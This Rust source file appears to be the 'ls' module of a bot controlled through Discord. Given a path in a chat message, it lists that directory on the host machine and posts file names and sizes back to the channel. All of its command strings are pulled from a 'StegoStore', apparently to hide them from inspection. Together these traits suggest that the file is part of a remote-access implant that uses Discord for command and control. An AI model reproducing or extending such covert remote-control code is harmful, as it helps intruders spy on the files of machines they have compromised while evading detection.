use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use std::env;
use std::fs;
use std::path::Path;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct LsCommand;

impl LsCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Filesystem, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for LsCommand {
    fn name(&self) -> &str {
        Box::leak(Self::c("LS_NAME").into_boxed_str())
    }
    
    fn description(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::Desc, "LS").into_boxed_str())
    }
    
    fn category(&self) -> &str {
        Box::leak(Self::c("CAT_FS").into_boxed_str())
    }
    
    fn usage(&self) -> &str {
        Box::leak(Self::c("LS_USAGE").into_boxed_str())
    }
    
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![".ls", ".ls /tmp"].into_boxed_slice())
    }
    
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(Self::c("LS_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("LS_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let path_arg = args.next().unwrap_or(".");
        let path = if path_arg == "." {
            env::current_dir().unwrap_or_else(|_| Path::new(".").to_path_buf())
        } else {
            Path::new(path_arg).to_path_buf()
        };

        if !path.exists() {
            http.create_message(msg.channel_id.get(), &format!("{}: `{}`", Self::f("PATH_NOT_FOUND"), path.display())).await?;
            return Ok(());
        }

        if !path.is_dir() {
            http.create_message(msg.channel_id.get(), &format!(
                    "{}: `{}`",
                    Self::f("ERR_PATH_NOT_DIR"),
                    path.display()
                )).await?;
            return Ok(());
        }

        match fs::read_dir(&path) {
            Ok(entries) => {
                let mut files = Vec::new();
                let mut directories = Vec::new();

                for entry in entries {
                    if let Ok(entry) = entry {
                        let file_name = entry.file_name();
                        let file_name_str = file_name.to_string_lossy();

                        if let Ok(metadata) = entry.metadata() {
                            if metadata.is_dir() {
                                directories.push(format!("**{}**", file_name_str));
                            } else {
                                let size = metadata.len();
                                let size_str = if size < 1024 {
                                    format!("{} B", size)
                                } else if size < 1024 * 1024 {
                                    format!("{:.1} KB", size as f64 / 1024.0)
                                } else {
                                    format!("{:.1} MB", size as f64 / (1024.0 * 1024.0))
                                };
                                files.push(format!("{} ({})", file_name_str, size_str));
                            }
                        }
                    }
                }

                directories.sort();
                files.sort();

                let mut output = format!("{} `{}`\n\n", Self::f("LS_TITLE"), path.display());

                if !directories.is_empty() {
                    output.push_str(&format!("{}\n", Self::f("LS_DIRS")));
                    output.push_str(&directories.join("\n"));
                    output.push('\n');
                }

                if !files.is_empty() {
                    output.push_str(&format!("{}\n", Self::f("LS_FILES")));
                    output.push_str(&files.join("\n"));
                }

                if directories.is_empty() && files.is_empty() {
                    output.push_str(&Self::f("LS_EMPTY"));
                }

                // Discord has a 2000 character limit
                if output.len() > 1900 {
                    let truncated = &output[..1900];
                    http.create_message(msg.channel_id.get(), &format!("{}\n\n{}", truncated, Self::f("LS_TRUNCATED"))).await?;
                } else {
                    http.create_message(msg.channel_id.get(), &output).await?;
                }
            }
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!(
                        "{}: `{}`: {}",
                        Self::f("ERR_DIR_READ"),
                        path.display(),
                        e
                    )).await?;
            }
        }

        Ok(())
    }
}


